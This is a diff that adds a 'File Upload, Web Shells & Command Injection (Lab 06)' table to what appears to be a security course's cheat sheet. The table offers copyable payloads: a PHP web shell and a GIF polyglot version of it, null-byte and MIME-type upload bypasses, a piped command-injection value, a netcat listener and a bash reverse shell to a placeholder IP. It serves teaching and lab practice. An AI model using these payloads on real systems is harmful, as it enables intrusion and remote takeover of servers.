@@ -672,6 +672,127 @@
       </div>
     </section>
 
+    <!-- Category 3e: File Upload, Web Shells & Command Injection -->
+    <section class="cheat-section" id="web-shells">
+      <div class="cheat-section__header">
+        <span style="font-size:1.25rem;">🐚</span>
+        <h2 class="cheat-section__title">File Upload, Web Shells &amp; Command Injection (Lab 06)</h2>
+      </div>
+      <div class="cheat-table-container">
+        <table class="cheat-table">
+          <thead>
+            <tr>
+              <th style="width:40%;">Payload / Command</th>
+              <th style="width:22%;">Action</th>
+              <th style="width:28%;">How It Works</th>
+              <th style="width:10%;">Source</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>curl -s http://localhost:3000/robots.txt</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('curl -s http://localhost:3000/robots.txt')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Misconfig discovery</strong></td>
+              <td>Reveals hidden paths like <span class="flag-pill">Disallow: /ftp</span> without brute-forcing</td>
+              <td><a href="./labs/lab06.html#misconfig-recon" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>/ftp/package.json.bak%2500.md</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('/ftp/package.json.bak%2500.md')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Double-encoded null byte</strong></td>
+              <td>Express decodes <span class="flag-pill">%25</span> to <code>%</code> so the allowlist sees <code>.md</code> while <code>cutOffPoisonNullByte()</code> truncates at <code>%00</code></td>
+              <td><a href="./labs/lab06.html#misconfig-recon" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;?php system($_GET['cmd']); ?&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('&lt;?php system($_GET[\'cmd\']); ?&gt;')">Copy</button>
+                </div>
+              </td>
+              <td><strong>PHP web shell</strong></td>
+              <td>Upload as <code>.php</code> to a PHP-capable server, then request <code>?cmd=id</code> to run OS commands and return stdout</td>
+              <td><a href="./labs/lab06.html#webshell-upload" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>Content-Type: image/jpeg</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('Content-Type: image/jpeg')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Spoof upload MIME type</strong></td>
+              <td>Keep <span class="flag-pill">filename="exploit.php"</span> in Burp Repeater and lie in the part header when the server trusts client MIME strings</td>
+              <td><a href="./labs/lab06.html#beat-the-filter" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>exploit.php%00.jpg</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('exploit.php%00.jpg')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Filename null-byte bypass</strong></td>
+              <td>Upload filter checks trailing <code>.jpg</code>; save routine truncates at decoded <span class="flag-pill">%00</span> to store <code>exploit.php</code></td>
+              <td><a href="./labs/lab06.html#beat-the-filter" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('GIF89a&lt;?php system($_GET[\'cmd\']); ?&gt;')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Magic-byte polyglot</strong></td>
+              <td>Prepends <span class="flag-pill">GIF89a</span> header bytes to clear leading signature checks while PHP still runs the embedded tag</td>
+              <td><a href="./labs/lab06.html#magic-bytes-polyglot" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>productId=1&amp;storeId=1|whoami</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('productId=1&storeId=1|whoami')">Copy</button>
+                </div>
+              </td>
+              <td><strong>OS command injection</strong></td>
+              <td>Pipes output into <code>whoami</code> inside <code>/bin/sh</code> without splitting the form body (use <span class="flag-pill">|</span>, <code>;</code>, or <code>%26</code> instead of raw <code>&amp;</code>)</td>
+              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>nc -lvnp 4444</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('nc -lvnp 4444')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Reverse shell listener</strong></td>
+              <td><span class="flag-pill">-l</span> listen, <span class="flag-pill">-v</span> verbose, <span class="flag-pill">-n</span> no DNS, <span class="flag-pill">-p</span> port. Catches an inbound shell connection</td>
+              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Bash reverse shell</strong></td>
+              <td>Target dials out to your listener over TCP so you get an interactive terminal (used live over VPN in Week 8)</td>
+              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
     <!-- Category 4: Transport Layer & Handshake State Probing -->
     <section class="cheat-section" id="tcp-handshake">
       <div class="cheat-section__header">
